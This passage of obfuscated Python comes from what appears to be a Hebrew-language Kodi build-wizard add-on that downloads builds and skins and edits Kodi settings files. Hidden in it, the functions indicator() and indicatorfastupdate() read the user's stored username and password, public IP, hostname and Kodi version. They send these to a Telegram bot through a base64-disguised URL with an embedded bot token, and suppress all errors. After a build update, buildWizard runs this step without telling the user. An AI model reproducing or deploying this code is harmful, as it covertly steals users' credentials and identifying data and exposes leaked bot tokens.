        O00O0000OOO0OOO0O =time .time ()#line:3387
        with open (OOO0OOOOO0O00O00O ,"wb")as O00OOOOOOOO0O0O00 :#line:3389
            O0OO00OO0000OO000 =1 #line:3390
            O00OOO000O0O00O00 =32768 #line:3391
            try :#line:3392
                OO000OOOO00000000 =int (O0O000O000O0OO00O .headers .get ('content-length'))#line:3393
                print ('file total size :',OO000OOOO00000000 )#line:3394
            except TypeError :#line:3395
                print ('using dummy length !!!')#line:3396
                OO000OOOO00000000 =int (O0OOO000OOO0O0000 )*1000000 #line:3397
            for O0OO000OOO00OOO00 in O0O000O000O0OO00O .iter_content (OOOO0OOOOOOO000O0 ):#line:3398
                if O0OO000OOO00OOO00 :#line:3399
                    O00OOOOOOOO0O0O00 .write (O0OO000OOO00OOO00 )#line:3400
                    O00OOOOOOOO0O0O00 .flush ()#line:3401
                    O000O0O000O0O000O =time .time ()-O00O0000OOO0OOO0O #line:3402
                    OO0OOO00O000O0OOO =int (O0OO00OO0000OO000 *O00OOO000O0O00O00 )#line:3403
                    if O000O0O000O0O000O ==0 :#line:3404
                        O000O0O000O0O000O =0.1 #line:3405
                    O0OOOO000OO0O0O0O =int (OO0OOO00O000O0OOO /(1024 *O000O0O000O0O000O ))#line:3406
                    O0OO0OO00000OO0OO =int (O0OO00OO0000OO000 *O00OOO000O0O00O00 *100 /OO000OOOO00000000 )#line:3407
                    if O0OOOO000OO0O0O0O >1024 and not O0OO0OO00000OO0OO ==100 :#line:3408
                      O0OO0OOOO000O00OO =int (((OO000OOOO00000000 -OO0OOO00O000O0OOO )/1024 )/(O0OOOO000OO0O0O0O ))#line:3409
                    else :#line:3410
                      O0OO0OOOO000O00OO =0 #line:3411
                    OOO0O0OO0000OOO0O .update (int (O0OO0OO00000OO0OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OO0OO00000OO0OO ,OO0OOO00O000O0OOO /(1024 *1024 ),OO000OOOO00000000 /(1000 *1000 ),O0OOOO000OO0O0O0O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0OO0OOOO000O00OO ,60 ))#line:3413
                    O0OO00OO0000OO000 +=1 #line:3414
                    if OOO0O0OO0000OOO0O .iscanceled ():#line:3415
                     OOO0O0OO0000OOO0O .close ()#line:3416
                     break #line:3417
    OO0000OO00OO0O00O ="https://docs.google.com/uc?export=download"#line:3418
    import urllib2 #line:3423
    import cookielib #line:3424
    from cookielib import CookieJar #line:3426
    OOO000O0OOO0OO0O0 =CookieJar ()#line:3428
    O00OO00O0000O0O0O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OOO000O0OOO0OO0O0 ))#line:3429
    OO00OOOOOOO00OO0O ={'id':O0OOO0OO0OO0OOOO0 }#line:3431
    O0OO00000OO0O0OOO =urllib .urlencode (OO00OOOOOOO00OO0O )#line:3432
    logging .warning (OO0000OO00OO0O00O +'&'+O0OO00000OO0O0OOO )#line:3433
    O000O0O0OOO0OO0O0 =O00OO00O0000O0O0O .open (OO0000OO00OO0O00O +'&'+O0OO00000OO0O0OOO )#line:3434
    OO0OO0000O0O000O0 =O000O0O0OOO0OO0O0 .read ()#line:3435
    for O0000OOO0OO00OOO0 in OOO000O0OOO0OO0O0 :#line:3437
         logging .warning (O0000OOO0OO00OOO0 )#line:3438
    OOO0OO0OO0OOOOO0O =O0O00O0OO000O0O00 (OOO000O0OOO0OO0O0 )#line:3439
    logging .warning (OOO0OO0OO0OOOOO0O )#line:3440
    if OOO0OO0OO0OOOOO0O :#line:3441
        O00O0OOOOOO00O0O0 ={'id':O0OOO0OO0OO0OOOO0 ,'confirm':OOO0OO0OO0OOOOO0O }#line:3442
        O0O0OO00OOOO00O0O ={'Access-Control-Allow-Headers':'Content-Length'}#line:3443
        O0OO00000OO0O0OOO =urllib .urlencode (O00O0OOOOOO00O0O0 )#line:3444
        O000O0O0OOO0OO0O0 =O00OO00O0000O0O0O .open (OO0000OO00OO0O00O +'&'+O0OO00000OO0O0OOO )#line:3445
        chunk_read (O000O0O0OOO0OO0O0 ,report_hook =chunk_report ,dp =OOO0O0OO0000OOO0O ,destination =O0O000O0000OO0OO0 ,filesize =O0OOO000OOO0O0000 )#line:3446
    return (OO00O0OOO000O000O )#line:3450
def kodi17Fix ():#line:3451
	OOOOO00OOOO00O000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3452
	O0OOO000OO000000O =[]#line:3453
	for OOO000OOOOO0O00O0 in sorted (OOOOO00OOOO00O000 ,key =lambda O0O000OOO000OO00O :O0O000OOO000OO00O ):#line:3454
		OOOO0O00000O0O000 =os .path .join (OOO000OOOOO0O00O0 ,'addon.xml')#line:3455
		if os .path .exists (OOOO0O00000O0O000 ):#line:3456
			OOOO0000O0OOOO0O0 =OOO000OOOOO0O00O0 .replace (ADDONS ,'')[1 :-1 ]#line:3457
			OO0O00O0OO0O000O0 =open (OOOO0O00000O0O000 )#line:3458
			O00O0O000O0OOO00O =OO0O00O0OO0O000O0 .read ()#line:3459
			O0OOO00000000000O =parseDOM (O00O0O000O0OOO00O ,'addon',ret ='id')#line:3460
			OO0O00O0OO0O000O0 .close ()#line:3461
			try :#line:3462
				O0OO000O0O00O0OOO =xbmcaddon .Addon (id =O0OOO00000000000O [0 ])#line:3463
			except :#line:3464
				try :#line:3465
					log ("%s was disabled"%O0OOO00000000000O [0 ],xbmc .LOGDEBUG )#line:3466
					O0OOO000OO000000O .append (O0OOO00000000000O [0 ])#line:3467
				except :#line:3468
					try :#line:3469
						log ("%s was disabled"%OOOO0000O0OOOO0O0 ,xbmc .LOGDEBUG )#line:3470
						O0OOO000OO000000O .append (OOOO0000O0OOOO0O0 )#line:3471
					except :#line:3472
						if len (O0OOO00000000000O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OOOO0000O0OOOO0O0 ,xbmc .LOGERROR )#line:3473
						else :log ("Unabled to enable: %s"%OOO000OOOOO0O00O0 ,xbmc .LOGERROR )#line:3474
	if len (O0OOO000OO000000O )>0 :#line:3475
		OO0OOO00000OO0OO0 =0 #line:3476
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3477
		for OO0OOO00OO0O000O0 in O0OOO000OO000000O :#line:3478
			OO0OOO00000OO0OO0 +=1 #line:3479
			O000O0000OO00O0OO =int (percentage (OO0OOO00000OO0OO0 ,len (O0OOO000OO000000O )))#line:3480
			DP .update (O000O0000OO00O0OO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO00OO0O000O0 ))#line:3481
			addonDatabase (OO0OOO00OO0O000O0 ,1 )#line:3482
			if DP .iscanceled ():break #line:3483
		if DP .iscanceled ():#line:3484
			DP .close ()#line:3485
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3486
			sys .exit ()#line:3487
		DP .close ()#line:3488
	forceUpdate ()#line:3489
def indicator ():#line:3491
       try :#line:3492
          import json #line:3493
          wiz .log ('FRESH MESSAGE')#line:3494
          O0OO0O00O0OOOO0O0 =(ADDON .getSetting ("user"))#line:3495
          O0O00O0000O0OO0OO =(ADDON .getSetting ("pass"))#line:3496
          O00OOOOOOO00000O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3497
          OOOO00OOOO00OOOOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3498
          O0O0OOOO0O00000O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3499
          OO000OOOO0O0OO000 =str (json .loads (O0O0OOOO0O00000O0 )['ip'])#line:3500
          OO0OO00OOOOO0O00O =O0OO0O00O0OOOO0O0 #line:3501
          O000O00000O000O00 =O0O00O0000O0OO0OO #line:3502
          import socket #line:3503
          O0O0OOOO0O00000O0 =urllib2 .urlopen (OOOO00OOOO00OOOOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO0OO00OOOOO0O00O +' - '+O000O00000O000O00 +' - '+O00OOOOOOO00000O0 +' - '+OO000OOOO0O0OO000 ).readlines ()#line:3504
       except :pass #line:3506
def indicatorfastupdate ():#line:3508
       try :#line:3509
          import json #line:3510
          wiz .log ('FRESH MESSAGE')#line:3511
          O00OO00000OOOO00O =(ADDON .getSetting ("user"))#line:3512
          O000OOO0OO0OOO000 =(ADDON .getSetting ("pass"))#line:3513
          OO0OO0OOO0OO0OO0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3514
          O000OOOO0O00O00OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3516
          O00OOOOO0O00O000O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3517
          OO0OOO00OOOOO0OO0 =str (json .loads (O00OOOOO0O00O000O )['ip'])#line:3518
          OOOOOO0OO0OO0000O =O00OO00000OOOO00O #line:3519
          O0OOO00OO0O0OO0O0 =O000OOO0OO0OOO000 #line:3520
          import socket #line:3522
          O00OOOOO0O00O000O =urllib2 .urlopen (O000OOOO0O00O00OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOOOO0OO0OO0000O +' - '+O0OOO00OO0O0OO0O0 +' - '+OO0OO0OOO0OO0OO0O +' - '+OO0OOO00OOOOO0OO0 ).readlines ()#line:3523
       except :pass #line:3525
def skinfix18 ():#line:3527
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3528
		O00OOOO000OO0OO00 =wiz .workingURL (SKINID18DDONXML )#line:3529
		if O00OOOO000OO0OO00 ==True :#line:3530
			O0OOO000O00000OOO =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3531
			if len (O0OOO000O00000OOO )>0 :#line:3532
				O0O000O00O0O0OOOO ='%s-%s.zip'%(SKINID18 ,O0OOO000O00000OOO [0 ])#line:3533
				OO000O0OO0O0000O0 =wiz .workingURL (SKIN18ZIPURL +O0O000O00O0O0OOOO )#line:3534
				if OO000O0OO0O0000O0 ==True :#line:3535
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3536
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3537
					OOOOOO000O0000OOO =os .path .join (PACKAGES ,O0O000O00O0O0OOOO )#line:3538
					try :os .remove (OOOOOO000O0000OOO )#line:3539
					except :pass #line:3540
					downloader .download (SKIN18ZIPURL +O0O000O00O0O0OOOO ,OOOOOO000O0000OOO ,DP )#line:3541
					extract .all (OOOOOO000O0000OOO ,HOME ,DP )#line:3542
					try :#line:3543
						OO0OO0O000OOO0000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3544
						OOOOO0OOO0O00OOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3545
						os .rename (OO0OO0O000OOO0000 ,OOOOO0OOO0O00OOO0 )#line:3546
					except :#line:3547
						pass #line:3548
					try :#line:3549
						OO00OOOO0OOOOOOO0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O000O0OO000O0OOOO =OO00OOOO0OOOOOOO0 .read ();OO00OOOO0OOOOOOO0 .close ()#line:3550
						OO0000O00O00000OO =wiz .parseDOM (O000O0OO000O0OOOO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3551
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0000O00O00000OO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3552
					except :#line:3553
						pass #line:3554
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3555
					DP .close ()#line:3556
					xbmc .sleep (500 )#line:3557
					wiz .forceUpdate (True )#line:3558
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3559
				else :#line:3560
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3561
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO000O0OO0O0000O0 ,xbmc .LOGERROR )#line:3562
			else :#line:3563
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3564
		else :#line:3565
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3566
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3567
def skinfix17 ():#line:3568
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3569
		OOOO0OOO0O00O0000 =wiz .workingURL (SKINID17DDONXML )#line:3570
		if OOOO0OOO0O00O0000 ==True :#line:3571
			O0OOOOO0OOO0O0O0O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3572
			if len (O0OOOOO0OOO0O0O0O )>0 :#line:3573
				OO0OO0OO0OOOOOO00 ='%s-%s.zip'%(SKINID17 ,O0OOOOO0OOO0O0O0O [0 ])#line:3574
				O0OO000O0OOOO0OO0 =wiz .workingURL (SKIN17ZIPURL +OO0OO0OO0OOOOOO00 )#line:3575
				if O0OO000O0OOOO0OO0 ==True :#line:3576
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3577
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3578
					O0OOO00O00OOOOO0O =os .path .join (PACKAGES ,OO0OO0OO0OOOOOO00 )#line:3579
					try :os .remove (O0OOO00O00OOOOO0O )#line:3580
					except :pass #line:3581
					downloader .download (SKIN17ZIPURL +OO0OO0OO0OOOOOO00 ,O0OOO00O00OOOOO0O ,DP )#line:3582
					extract .all (O0OOO00O00OOOOO0O ,HOME ,DP )#line:3583
					try :#line:3584
						OOOO0O00OO0OO0OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3585
						O000O0OO000OOO000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3586
						os .rename (OOOO0O00OO0OO0OOO ,O000O0OO000OOO000 )#line:3587
					except :#line:3588
						pass #line:3589
					try :#line:3590
						OO000O0OO0000OO0O =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OOO00OOO000000O00 =OO000O0OO0000OO0O .read ();OO000O0OO0000OO0O .close ()#line:3591
						O0O0O00O000O00OO0 =wiz .parseDOM (OOO00OOO000000O00 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3592
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O00O000O00OO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3593
					except :#line:3594
						pass #line:3595
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3596
					DP .close ()#line:3597
					xbmc .sleep (500 )#line:3598
					wiz .forceUpdate (True )#line:3599
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3600
				else :#line:3601
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3602
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OO000O0OOOO0OO0 ,xbmc .LOGERROR )#line:3603
			else :#line:3604
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3605
		else :#line:3606
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3607
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3608
def fix17update ():#line:3609
	if KODIV >=17 and KODIV <18 :#line:3610
		wiz .kodi17Fix ()#line:3611
		xbmc .sleep (4000 )#line:3612
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3613
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3614
		fixfont ()#line:3615
		O0OO0OOOOOOOOOOO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3616
		try :#line:3618
			O0OOOO0O0OOOO0000 =open (O0OO0OOOOOOOOOOO0 ,'r')#line:3619
			OOOO0OO00O0OOO0OO =O0OOOO0O0OOOO0000 .read ()#line:3620
			O0OOOO0O0OOOO0000 .close ()#line:3621
			OO0000O0O00O0OO00 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3622
			OOO00O0O0OO00OO0O =re .compile (OO0000O0O00O0OO00 ).findall (OOOO0OO00O0OOO0OO )[0 ]#line:3623
			O0OOOO0O0OOOO0000 =open (O0OO0OOOOOOOOOOO0 ,'w')#line:3624
			O0OOOO0O0OOOO0000 .write (OOOO0OO00O0OOO0OO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOO00O0O0OO00OO0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3625
			O0OOOO0O0OOOO0000 .close ()#line:3626
		except :#line:3627
				pass #line:3628
		wiz .kodi17Fix ()#line:3629
		O0OO0OOOOOOOOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3630
		try :#line:3631
			O0OOOO0O0OOOO0000 =open (O0OO0OOOOOOOOOOO0 ,'r')#line:3632
			OOOO0OO00O0OOO0OO =O0OOOO0O0OOOO0000 .read ()#line:3633
			O0OOOO0O0OOOO0000 .close ()#line:3634
			OO0000O0O00O0OO00 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3635
			OOO00O0O0OO00OO0O =re .compile (OO0000O0O00O0OO00 ).findall (OOOO0OO00O0OOO0OO )[0 ]#line:3636
			O0OOOO0O0OOOO0000 =open (O0OO0OOOOOOOOOOO0 ,'w')#line:3637
			O0OOOO0O0OOOO0000 .write (OOOO0OO00O0OOO0OO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOO00O0O0OO00OO0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3638
			O0OOOO0O0OOOO0000 .close ()#line:3639
		except :#line:3640
				pass #line:3641
		swapSkins ('skin.Premium.mod')#line:3642
def fix18update ():#line:3644
	if KODIV >=18 :#line:3645
		xbmc .sleep (4000 )#line:3646
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3647
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3648
		fixfont ()#line:3649
		O0O0O0OO000O00OO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3650
		try :#line:3651
			OOOO0OOO0OOO00O0O =open (O0O0O0OO000O00OO0 ,'r')#line:3652
			OOOO0OO00OOOO0000 =OOOO0OOO0OOO00O0O .read ()#line:3653
			OOOO0OOO0OOO00O0O .close ()#line:3654
			OOOOOOO0OOO0O0OO0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3655
			OO0OOO000OO0OOOOO =re .compile (OOOOOOO0OOO0O0OO0 ).findall (OOOO0OO00OOOO0000 )[0 ]#line:3656
			OOOO0OOO0OOO00O0O =open (O0O0O0OO000O00OO0 ,'w')#line:3657
			OOOO0OOO0OOO00O0O .write (OOOO0OO00OOOO0000 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OO0OOO000OO0OOOOO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3658
			OOOO0OOO0OOO00O0O .close ()#line:3659
		except :#line:3660
				pass #line:3661
		wiz .kodi17Fix ()#line:3662
		O0O0O0OO000O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3663
		try :#line:3664
			OOOO0OOO0OOO00O0O =open (O0O0O0OO000O00OO0 ,'r')#line:3665
			OOOO0OO00OOOO0000 =OOOO0OOO0OOO00O0O .read ()#line:3666
			OOOO0OOO0OOO00O0O .close ()#line:3667
			OOOOOOO0OOO0O0OO0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3668
			OO0OOO000OO0OOOOO =re .compile (OOOOOOO0OOO0O0OO0 ).findall (OOOO0OO00OOOO0000 )[0 ]#line:3669
			OOOO0OOO0OOO00O0O =open (O0O0O0OO000O00OO0 ,'w')#line:3670
			OOOO0OOO0OOO00O0O .write (OOOO0OO00OOOO0000 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OO0OOO000OO0OOOOO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3671
			OOOO0OOO0OOO00O0O .close ()#line:3672
		except :#line:3673
				pass #line:3674
		swapSkins ('skin.Premium.mod')#line:3675
def buildWizard (O0O00OO0OOOO0OO0O ,OO00OOO0OO00O00O0 ,theme =None ,over =False ):#line:3678
	if over ==False :#line:3679
		OO000OOO0OO000OO0 =wiz .checkBuild (O0O00OO0OOOO0OO0O ,'url')#line:3680
		if OO000OOO0OO000OO0 ==False :#line:3682
			xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','אנא המתן')))#line:3686
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3687
			return #line:3688
		O0OOO0OO0OOOOOO0O =wiz .workingURL (OO000OOO0OO000OO0 )#line:3689
		if O0OOO0OO0OOOOOO0O ==False :#line:3690
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0OOO0OO0OOOOOO0O ))#line:3691
			return #line:3692
	if OO00OOO0OO00O00O0 =='gui':#line:3693
		if O0O00OO0OOOO0OO0O ==BUILDNAME :#line:3694
			if over ==True :O00OOOOOOO00000OO =1 #line:3695
			else :O00OOOOOOO00000OO =1 #line:3696
		else :#line:3697
			O00OOOOOOO00000OO =1 #line:3698
		if O00OOOOOOO00000OO :#line:3699
			remove_addons ()#line:3700
			remove_addons2 ()#line:3701
			O000O0O00OO0O0O0O =wiz .checkBuild (O0O00OO0OOOO0OO0O ,'gui')#line:3702
			OO0000O0OOO0OOO0O =O0O00OO0OOOO0OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3703
			if not wiz .workingURL (O000O0O00OO0O0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3704
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3705
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OO0OOOO0OO0O ),'','אנא המתן')#line:3706
			OO00OOO0O000000O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0000O0OOO0OOO0O )#line:3707
			try :os .remove (OO00OOO0O000000O0 )#line:3708
			except :pass #line:3709
			logging .warning (O000O0O00OO0O0O0O )#line:3710
			if 'google'in O000O0O00OO0O0O0O :#line:3711
			   O0OO0O0OO0OO0O0OO =googledrive_download (O000O0O00OO0O0O0O ,OO00OOO0O000000O0 ,DP ,wiz .checkBuild (O0O00OO0OOOO0OO0O ,'filesize'))#line:3712
			else :#line:3715
			  downloader .download (O000O0O00OO0O0O0O ,OO00OOO0O000000O0 ,DP )#line:3716
			xbmc .sleep (100 )#line:3717
			OO0OOO0OO0O0OO00O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OO0OOOO0OO0O )#line:3718
			DP .update (0 ,OO0OOO0OO0O0OO00O ,'','אנא המתן')#line:3719
			extract .all (OO00OOO0O000000O0 ,HOME ,DP ,title =OO0OOO0OO0O0OO00O )#line:3720
			DP .close ()#line:3721
			wiz .defaultSkin ()#line:3722
			wiz .lookandFeelData ('save')#line:3723
			wiz .kodi17Fix ()#line:3724
			if KODIV >=18 :#line:3725
				skindialogsettind18 ()#line:3726
			xbmc .executebuiltin ("ReloadSkin()")#line:3727
			if INSTALLMETHOD ==1 :O00O0000000OOO00O =1 #line:3728
			elif INSTALLMETHOD ==2 :O00O0000000OOO00O =0 #line:3729
			else :DP .close ()#line:3730
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3731
			indicatorfastupdate ()#line:3732
		else :#line:3734
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3735
	if OO00OOO0OO00O00O0 =='gui2':#line:3736
		if O0O00OO0OOOO0OO0O ==BUILDNAME :#line:3737
			if over ==True :O00OOOOOOO00000OO =1 #line:3738
			else :O00OOOOOOO00000OO =1 #line:3739
		else :#line:3740
			O00OOOOOOO00000OO =1 #line:3741
		if O00OOOOOOO00000OO :#line:3742
			remove_addons ()#line:3743
			remove_addons2 ()#line:3744
			O000O0O00OO0O0O0O =wiz .checkBuild (O0O00OO0OOOO0OO0O ,'gui')#line:3745
			OO0000O0OOO0OOO0O =O0O00OO0OOOO0OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3746
			if not wiz .workingURL (O000O0O00OO0O0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3747
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3748
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OO0OOOO0OO0O ),'','אנא המתן')#line:3749
			OO00OOO0O000000O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0000O0OOO0OOO0O )#line:3750
			try :os .remove (OO00OOO0O000000O0 )#line:3751
			except :pass #line:3752
			logging .warning (O000O0O00OO0O0O0O )#line:3753
			if 'google'in O000O0O00OO0O0O0O :#line:3754
			   O0OO0O0OO0OO0O0OO =googledrive_download (O000O0O00OO0O0O0O ,OO00OOO0O000000O0 ,DP ,wiz .checkBuild (O0O00OO0OOOO0OO0O ,'filesize'))#line:3755
			else :#line:3758
			  downloader .download (O000O0O00OO0O0O0O ,OO00OOO0O000000O0 ,DP )#line:3759
			xbmc .sleep (100 )#line:3760
			OO0OOO0OO0O0OO00O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OO0OOOO0OO0O )#line:3761
			DP .update (0 ,OO0OOO0OO0O0OO00O ,'','אנא המתן')#line:3762
			extract .all (OO00OOO0O000000O0 ,HOME ,DP ,title =OO0OOO0OO0O0OO00O )#line:3763
			DP .close ()#line:3764
			wiz .defaultSkin ()#line:3765
			wiz .lookandFeelData ('save')#line:3766
			if INSTALLMETHOD ==1 :O00O0000000OOO00O =1 #line:3769
			elif INSTALLMETHOD ==2 :O00O0000000OOO00O =0 #line:3770
			else :DP .close ()#line:3771
		else :#line:3773
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3774
	elif OO00OOO0OO00O00O0 =='fresh':#line:3775
		freshStart (O0O00OO0OOOO0OO0O )#line:3776
	elif OO00OOO0OO00O00O0 =='normal':#line:3777
		if url =='normal':#line:3778
			if KEEPTRAKT =='true':#line:3779
				traktit .autoUpdate ('all')#line:3780
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3781
			if KEEPREAL =='true':#line:3782
				debridit .autoUpdate ('all')#line:3783
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3784
			if KEEPLOGIN =='true':#line:3785
				loginit .autoUpdate ('all')#line:3786
